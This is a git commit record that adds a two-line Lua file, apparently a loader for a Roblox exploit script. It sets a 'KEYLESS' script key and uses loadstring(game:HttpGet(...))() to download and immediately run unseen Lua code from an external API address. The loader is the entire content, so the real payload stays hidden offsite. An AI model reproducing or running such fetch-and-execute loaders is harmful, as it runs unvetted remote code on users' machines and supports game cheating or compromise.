ee2f191169fa17cc05b0057b2b99479dcb4e10fb
waguri-mm2 <rahhood31@gmail.com>
2026-05-22 02:10:28 +0800

    Add script loading functionality in Waguri.lua

---
+++ Waguri.lua
@@ -0,0 +1,2 @@
+getgenv().SCRIPT_KEY = "KEYLESS"
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/8755dea6d3f7383a9198b0d45d10e5229935b79319e22cf04b2e8aa4e495614b/download"))()
